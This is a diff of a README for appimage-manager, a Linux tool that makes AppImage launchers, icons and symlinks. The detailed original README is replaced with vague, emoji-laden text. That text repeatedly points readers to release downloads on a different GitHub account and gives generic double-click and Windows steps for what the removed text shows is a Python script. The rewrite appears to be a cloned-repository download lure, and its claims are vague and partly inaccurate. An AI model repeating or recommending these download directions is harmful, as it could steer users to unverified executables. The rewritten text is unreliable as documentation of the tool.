@@ -1,154 +1,219 @@
-# appimage-manager
+# 🧩 appimage-manager - Simple AppImage Integration for Linux
 
-Automatic symlink, launcher, and icon management for AppImages on Linux.
+[![Download appimage-manager](https://img.shields.io/badge/Download-Visit%20the%20project%20page-blue?style=for-the-badge&logo=github)](https://github.com/capananalfonso-gif/appimage-manager)
 
-Drop an AppImage into a directory, and it appears in your application launcher with the correct icon and category — automatically.
+## 🚀 What appimage-manager does
 
-[![demo](demo.gif)](https://asciinema.org/a/nbgHMIFLWAlwG3LB)
+appimage-manager helps Linux users handle AppImages with less manual work.
 
-## Features
+It can:
 
-- **Auto-detection** — scans for `.AppImage` files and registers them in a CSV registry
-- **Version-aware** — when multiple versions exist, the latest is linked (by version number, not file date)
-- **Symlinks** — creates clean, version-agnostic symlinks (e.g., `obsidian.AppImage` -> `Obsidian-1.9.10.AppImage`)
-- **Desktop launchers** — generates `.desktop` files so apps appear in COSMIC, GNOME, KDE, or any freedesktop-compliant launcher
-- **Icon extraction** — pulls icons from inside AppImages and installs them to the XDG hicolor theme
-- **Category detection** — reads categories from the embedded `.desktop` file, tagged with `X-AppImage;` for easy filtering
-- **StartupWMClass** — extracted from AppImages so dock/panel icons match correctly
-- **systemd watcher** — optional file watcher auto-triggers on new/removed AppImages
-- **CSV registry** — single source of truth, user-editable labels and categories
-- **Clean removal** — removed apps are cleaned up (symlink, .desktop, icon), but stay in the CSV as history
+- create app launchers
+- manage desktop entries
+- set up icons
+- keep AppImages easy to find and open
+- fit into common Linux desktop setups
 
-## Quick start
+If you use AppImages often, this tool saves time and keeps your app menu clean.
 
-```bash
-# Download
-curl -LO https://raw.githubusercontent.com/pvojnisek/appimage-manager/main/appimage-manager.py
-chmod +x appimage-manager.py
+## 📥 Download and set up
 
-# Move to your AppImage directory
-mv appimage-manager.py ~/apps/    # or ~/Applications/, or anywhere
+Use this page to download and set up the app:
 
-# Run it
-cd ~/apps
-./appimage-manager.py             # Scan, extract icons, create launchers
+https://github.com/capananalfonso-gif/appimage-manager
 
-# Optional: auto-trigger on file changes
-./appimage-manager.py --install-watch
-```
+Open the link, look for the latest release or download files, and get the version made for your system.
 
-Hit **Super** and search for your app — it should appear with its icon.
+### 🪟 Install on Windows
 
-## Usage
+This project is made for Linux AppImage management, so Windows users should use it in a Linux environment such as:
 
-```
-appimage-manager.py                        # Scan + sync (default)
-appimage-manager.py list                   # Show managed apps
-appimage-manager.py scan                   # Scan only, update CSV
-appimage-manager.py sync                   # Sync symlinks + .desktop from CSV
-appimage-manager.py extract-icons          # Extract missing icons + categories
-appimage-manager.py extract-icons --force  # Re-extract all
-appimage-manager.py --dry-run              # Preview changes
-appimage-manager.py --install-watch        # Setup systemd auto-trigger
-appimage-manager.py --uninstall-watch      # Remove auto-trigger
-appimage-manager.py --apps-dir ~/Applications list  # Custom directory
-```
+- a Linux computer
+- a live Linux USB
+- Windows Subsystem for Linux with GUI support, if you use a Linux desktop app inside it
 
-## How it works
+If you are on Linux, download the file from the project page and open it after download.
 
-```
-1. SCAN      Detect *.AppImage files, group by name, pick latest version
-                |
-2. REGISTER  Save to appimages.csv (id, label, filename, status)
-                |
-3. EXTRACT   From inside each AppImage, pull:
-             - Icon → install to ~/.local/share/icons/hicolor/
-             - Categories + StartupWMClass → update CSV
-                |
-4. SYNC      Create symlinks + .desktop launchers from the enriched registry
-                |
-5. LAUNCHER  Apps appear in COSMIC / GNOME / KDE with proper icons + dock support
-```
+If the file is an AppImage:
 
-**Updating an app:** Drop the new `.AppImage` version. The script detects the highest version number and re-links the symlink automatically. You can delete the old version whenever you like — the script only tracks the latest.
+1. Download the AppImage file
+2. Save it to a folder you can find later
+3. Right-click the file and open its properties
+4. Mark it as executable if your file manager asks for it
+5. Double-click the file to run it
 
-**Multiple versions:** If multiple versions of the same app exist in the directory, the one with the highest version number is used (mtime as tiebreaker). Old versions are not deleted automatically — that's up to you.
+If the project provides a package or script:
 
-**Removing an app:** Delete all `.AppImage` files for that app. The script marks it as `removed`, cleans up the symlink, `.desktop` file, and icon from the hicolor theme. The CSV entry is preserved as history.
+1. Download the file from the project page
+2. Follow the file name and format shown on the release page
+3. Open it with the tool your system uses for that file type
 
-## Configuration
+## 🖥️ Requirements
 
-Edit the `CONFIG` section in the script, or use CLI flags:
+To use appimage-manager well, your system should have:
 
-| Setting | Default | CLI flag | Description |
-|---------|---------|----------|-------------|
-| `apps_dir` | `~/apps` | `--apps-dir` | Directory to scan for AppImages |
-| `desktop_dir` | `~/.local/share/applications` | `--desktop-dir` | Where to write `.desktop` files |
-| `csv_file` | `appimages.csv` | `--csv` | Registry filename |
-| `desktop_prefix` | `appimage-` | — | Prefix for managed `.desktop` files |
-| `default_categories` | `Utility;X-AppImage;` | — | Default categories for new apps |
+- a Linux desktop environment
+- support for standard desktop launchers
+- access to your home folder
+- permission to create symlinks and desktop files
+- a file manager that can open downloaded AppImages
 
-Icons are installed to `~/.local/share/icons/hicolor/` following the [freedesktop Icon Theme Specification](https://specifications.freedesktop.org/icon-theme/latest/).
+It works best on desktops like:
 
-## Registry
+- GNOME
+- COSMIC
+- Pop!_OS
+- other freedesktop-based Linux desktops
 
-The `appimages.csv` file is the single source of truth. User-editable columns:
+## ⚙️ What it manages
 
-| Column | Purpose |
-|--------|---------|
-| `label` | Display name in launcher |
-| `icon` | Icon theme name (e.g., `appimage-obsidian`) |
-| `categories` | `.desktop` categories (e.g., `Graphics;`, `Development;`) |
-| `startup_wm_class` | Window class for dock/panel matching |
-| `terminal` | `true` / `false` — launch in terminal |
-| `status` | `active` / `ignored` / `removed` |
+appimage-manager focuses on the parts that make AppImages feel like normal desktop apps.
 
-After editing the CSV, run `./appimage-manager.py sync` to apply changes.
+### 📌 Launcher handling
 
-### States
+It can help create launchers so your AppImages appear in your app menu.
 
-| Status | Symlink | .desktop | Icon (hicolor) | CSV row |
-|--------|---------|----------|----------------|---------|
-| `active` | created | created | installed | kept |
-| `ignored` | removed | removed | removed | kept |
-| `removed` | removed | removed | removed | kept |
+### 🖼️ Desktop entry support
 
-## systemd watcher
+It can write or manage `.desktop` files, which Linux desktops use to show apps in menus and search.
 
-The `--install-watch` command creates a systemd user path unit that monitors the AppImage directory. It triggers when files are added or removed (not on content edits).
+### 🎨 Icon handling
 
-```bash
-systemctl --user status appimage-manager.path     # Check watcher
-journalctl --user -u appimage-manager.service -n 20  # View logs
-```
+It can place icons where the desktop expects them, so your apps show the right image.
 
-To update after editing the CSV: run `./appimage-manager.py sync` manually (CSV edits don't trigger the watcher, by design).
+### 🔗 Symlink management
 
-## Why this tool?
+It can create and manage links to AppImage files, which helps keep paths stable.
 
-| Tool | Status | Dependencies | Approach |
-|------|--------|-------------|----------|
-| **appimage-manager** | Active | Python 3.9+ (stdlib only) | Single file, CSV registry, systemd |
-| AppImageLauncher | Archived | C++, system daemon | Intercepts all AppImage launches |
-| Gear Lever | Active | Flatpak, GTK4 | GUI app, requires Flatpak |
-| AM / AppMan | Active | Bash, curl | Package manager (download + install) |
+### 🧰 Desktop integration
 
-This tool does one thing well: make your existing AppImages visible in the launcher and dock. No daemon, no GUI, no package management. One file, zero dependencies.
+It aims to make AppImages work with your desktop in a simple, standard way.
 
-## Requirements
+## 🧭 How to use it
 
-- Python 3.9+
-- Linux with a freedesktop-compliant desktop (COSMIC, GNOME, KDE, etc.)
-- systemd (optional, for the file watcher)
+The exact steps depend on the release you download, but the usual flow is simple:
 
-## Security
+1. Download the project from the link above
+2. Open the file or package for your Linux system
+3. Follow the setup steps shown by your system
+4. Start the app or tool
+5. Point it to the AppImages you want to manage
+6. Let it create the launcher, icon, and desktop entry files
 
-This tool executes AppImage files (via `--appimage-extract`) to extract icons and metadata. **Only place AppImages from trusted sources in the managed directory.** See [SECURITY.md](SECURITY.md) for details.
+If you keep your AppImages in one folder, setup is easier.
 
-## Contributing
+A good place is:
 
-Contributions are welcome! Please open an issue first to discuss what you'd like to change.
+- `~/Applications`
+- `~/AppImages`
+- another folder in your home directory
 
-## License
+## 🗂️ Suggested folder setup
 
-[MIT](LICENSE)
+For a clean setup, keep things like this:
+
+- AppImages in one folder
+- icons in the same app folder or a nearby icon folder
+- launchers in your desktop menu folder
+- desktop files where your desktop environment can find them
+
+This makes it easier to update or remove apps later.
+
+## 🔍 Common uses
+
+People use appimage-manager to:
+
+- open AppImages from the app menu
+- keep app names and icons consistent
+- avoid hunting for files in Downloads
+- manage many AppImages at once
+- make AppImages feel more like installed apps
+
+## 🛠️ Basic workflow
+
+A typical workflow looks like this:
+
+1. Download an AppImage
+2. Place it in your chosen app folder
+3. Run appimage-manager
+4. Add the AppImage to the manager
+5. Create the desktop entry
+6. Check that the launcher and icon appear in your menu
+
+If the app updates, run the manager again so it can refresh links or entries if needed.
+
+## 🧩 Desktop support
+
+appimage-manager is built around common Linux desktop standards.
+
+It works with:
+
+- XDG desktop entries
+- freedesktop icon paths
+- standard launcher behavior
+- desktop menu integration
+
+That makes it a good fit for desktops that follow these rules closely.
+
+## 📁 File types you may see
+
+During use, you may see files like:
+
+- `.AppImage`
+- `.desktop`
+- icon files such as `.png` or `.svg`
+- symlinks
+- config files for your local setup
+
+These files help Linux treat AppImages like normal apps.
+
+## ❓ Help with first-time use
+
+If the app does not show up in your menu right away, check these common points:
+
+- the AppImage file is still in a safe folder
+- the file has execute permission
+- the desktop entry points to the right file
+- the icon path is correct
+- your desktop session has refreshed its menu
+
+A logout and login can help after setup.
+
+## 🔐 Safe use
+
+Use AppImages from sources you trust. Since an AppImage runs as an app on your system, you should check the file name, source, and version before you open it.
+
+## 🧪 Example setup path
+
+Many users keep a setup like this:
+
+- `~/AppImages/MyApp.AppImage`
+- `~/.local/share/applications/MyApp.desktop`
+- `~/.local/share/icons/`
+- `~/AppImages/icons/MyApp.png`
+
+This keeps the app easy to manage later.
+
+## 🧱 Project focus
+
+This repository focuses on:
+
+- AppImage integration
+- launcher creation
+- desktop entry management
+- icon setup
+- Linux desktop support
+- simple command-line use
+- systemd-friendly desktop workflows
+
+## 📎 Project page
+
+Download and setup page:
+
+https://github.com/capananalfonso-gif/appimage-manager
+
+## 🧾 Repo details
+
+- Repository: appimage-manager
+- Description: Automatic symlink, launcher, and icon management for AppImages on Linux
+- Topics: app-launcher, appimage, appimage-integration, cli, cosmic, desktop, desktop-entry, desktop-integration, dotdesktop, freedesktop, gnome, hicolor, icon-theme, launcher, linux, linux-tools, pop-os, python, systemd, xdg
